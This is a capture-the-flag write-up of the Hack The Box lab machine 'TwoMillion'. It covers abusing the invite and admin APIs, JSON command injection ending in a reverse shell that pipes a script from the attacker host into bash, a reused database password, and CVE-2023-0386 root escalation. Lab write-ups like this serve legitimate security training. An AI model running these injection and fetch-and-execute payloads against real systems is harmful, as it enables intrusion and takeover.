---
description: Happy 2 Million HTB!
---

# TwoMillion

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.76.193
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 18:45 +08
Nmap scan report for 10.129.76.193
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have to add `2million.htb` to our `/etc/hosts` file to view the web application.

### Invite Code Hunting

The website resembles the actual live HTB platform:

<figure><img src="../../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

The website also shows how long has HTB come since the start:

<figure><img src="../../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>

Anyways, we can attempt to register a user on this site and maybe find some sort of access control weakness. On the main page, there is a 'Join HTB' button, but it requires an invite code to access:

<figure><img src="../../../.gitbook/assets/image (1037).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2722).png" alt=""><figcaption></figcaption></figure>

I didn't have an invite code, so we'll have to leave this for now. I also don't have any credentials to register a user, so the website's applications have limited use as of now. We can do a directory and subdomain scan for this site. I ran a `feroxbuster` directory scan and a `wfuzz` subdomain scan. The `feroxbuster` scan returned some interesting stuff:

<figure><img src="../../../.gitbook/assets/image (2308).png" alt=""><figcaption></figcaption></figure>

There was a `register` directory present.&#x20;

<figure><img src="../../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

I couldn't register an account because I still didn't have an invite code at all. I looked at the account in Burpsuite, and found this at the bottom of the page:

<figure><img src="../../../.gitbook/assets/image (1519).png" alt=""><figcaption></figcaption></figure>

There's an `inviteapi.min.js` file that looks custom. Here's the contents of that file:

{% code overflow="wrap" %}
```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
{% endcode %}

This looks like it generates some kind of token. Within it, we can see that it uses a `makeInviteCode` function. This file is loaded at the `/invite` directory, which is where we need to submit a code. Within the Javascript Console in Inspector tools, I ran that function.

<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

When we send a POST request to this:

{% code overflow="wrap" %}
```
$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
{% endcode %}

This is a ROT13 cipher. When decrypted, we get this:

{% code overflow="wrap" %}
```
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```
{% endcode %}

Following these instructions, we can get the invite code we need.&#x20;

{% code overflow="wrap" %}
```
$ curl -X POST http://2million.htb/api/v1/invite/generate       
{"0":200,"success":1,"data":{"code":"RFlYVVotUjJIOUUtOTM3NTAtUlNWUkM=","format":"encoded"}}

$ echo RFlYVVotUjJIOUUtOTM3NTAtUlNWUkM= | base64 -d                    
DYXUZ-R2H9E-93750-RSVRC
```
{% endcode %}

Using this, we can finally register and login to view the dashboard:

<figure><img src="../../../.gitbook/assets/image (4082).png" alt=""><figcaption></figcaption></figure>

### API Enumeration --> Injection

The thing that stands out the most is the fact that thereis an ongoing database migration for the site, and that some features are unavailable. There wasn't much functionality within this site, so I visited the `/api/v1` directory that we used earlier to generate the invite code.&#x20;

Since we are an 'authenticated user',  I grabbed our cookie and visited it, revealing more about the API routes present:

{% code overflow="wrap" %}
```
$ curl -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' http://2million.htb/api/v1 | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
{% endcode %}

If we were to visit the iste without the cookie specified, then we would not be able to view this information. Our next goal here is to become the administrator of the site. Naturally, the "Update user settings" bit looks the most vulnerable.&#x20;

If we send a PUT request to it without any information, we get this:

```http
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 15 Jun 2023 13:43:17 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53


{"status":"danger","message":"Invalid content type."}
```

Since this is using JSON, let's change the Content-Type header to that. Then, it complains about another error.&#x20;

```json
{"status":"danger","message":"Missing parameter: email"}
```

Adding that results in yet another error:

```json
{"status":"danger","message":"Missing parameter: is_admin"}
```

Setting the value of that to 1 seems to work:

<figure><img src="../../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

We can verify that we are an admin using the `/api/v1/admin/auth` endpoint.&#x20;

```
$ curl -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' http://2million.htb/api/v1/admin/auth
{"message":true}
```

Then, we can look at the only other feature I haven't used, which is the OVPN feature. Using the `generate` feature seems to produce an `.ovpn` file.

<figure><img src="../../../.gitbook/assets/image (859).png" alt=""><figcaption></figcaption></figure>

When trying the administrator version of the generation, we get the same response complaining about the Content-Type header, and then it requests for a username:

```
$ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' http://2million.htb/api/v1/admin/vpn/generate
{"status":"danger","message":"Missing parameter: username"}
```

When supplied, it would generate the `.ovpn` file normally.

<figure><img src="../../../.gitbook/assets/image (1564).png" alt=""><figcaption></figcaption></figure>

The only difference between the administrator and user VPN generation is that I need to supply a parameter, so let's test that for injection. Using the subshell `$()` feature, I was able to achieve blind RCE:

{% code overflow="wrap" %}
```
$ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' -d '{"username":"$(ping -c 1 10.10.14.42)"}' http://2million.htb/api/v1/admin/vpn/generate
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2364).png" alt=""><figcaption></figcaption></figure>

We can get a reverse shell by replacing the command with `curl 10.10.14.42/shell.sh | bash`.&#x20;

{% code overflow="wrap" %}
```
$ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' -d '{"username":"$(curl 10.10.14.42/shell.sh|bash)"}' http://2million.htb/api/v1/admin/vpn/generate
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1917).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We cannot grab the user flag from the `admin` user just yet.&#x20;

### Admin Creds

Within the `/var/www/html` file, there was a `.env` file present with credentials.

```
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Jun 15 13:50 .
drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4096 Jun 15 13:50 VPN
drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets
drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4096 Jun  6 10:22 css
drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4096 Jun  6 10:22 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  6 10:22 js
drwxr-xr-x  2 root root 4096 Jun  6 10:22 views
www-data@2million:~/html$ caty .e^C
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Using that, we can `su` to `admin`.

<figure><img src="../../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

### Mail --> CVE Exploit

This user had no `sudo` privileges, and I also did not find any files in `/opt`. Even `pspy64` didn't return anything useful. I wanted to see if this user had ownership over any other files within the system, so I used `find` to do that:

```bash
$ find / -user admin 2> /dev/null | grep -v 'sys' | grep -v 'proc
<TRUNCATED>
/var/mail/admin
```

I found one mail for the user, and here's the contents:

{% code overflow="wrap" %}
```
admin@2million:/tmp$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
{% endcode %}

There was direct mention of a CVE that came out this year, and the one that matches its description is CVE-2023-0386.

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2023-0386" %}

There's some PoCs on Github already, so let's try it. A few of the exploits don't work because of issues with `fuse.h`, but I eventually found one that works well:

{% embed url="https://github.com/xkaneiki/CVE-2023-0386/tree/main" %}

We can download the repository, and then run `make all` to create the binaries we which are the  `exp`, `fuse`, and a `gc` binaries. Afterwards, we can transfer all of these to the machine and run this command:

```
admin@2million:/tmp$ ./fuse ./ovlcap/lower ./gc
```

In a second shell (over `ssh`), we can run `exp` and get a root shell!

<figure><img src="../../../.gitbook/assets/image (4057).png" alt=""><figcaption></figcaption></figure>

Then we can grab the root flag.

## Extra Challenge

Within the `/root` directory, there's another `.json` file present:

```
root@2million:/root# ls
root.txt  snap  thank_you.json
```

Here's the contents:

{% code overflow="wrap" %}
```
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```
{% endcode %}

This whole thing is in hex, so I used Cyberchef to decode it:

<figure><img src="../../../.gitbook/assets/image (992).png" alt=""><figcaption></figcaption></figure>

Now it's being XOR'd with 'HackTheBox' as the key. The output can be decoded and piped to an XOR command with the specified key to find a hidden message:

<figure><img src="../../../.gitbook/assets/image (3933).png" alt=""><figcaption></figcaption></figure>

Here's the message:

{% code overflow="wrap" %}
```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```
{% endcode %}

This was a nice end to their milestone box. All in all, great website that has helped me immensely (and also frustrated me greatly...). Thank you HTB!&#x20;
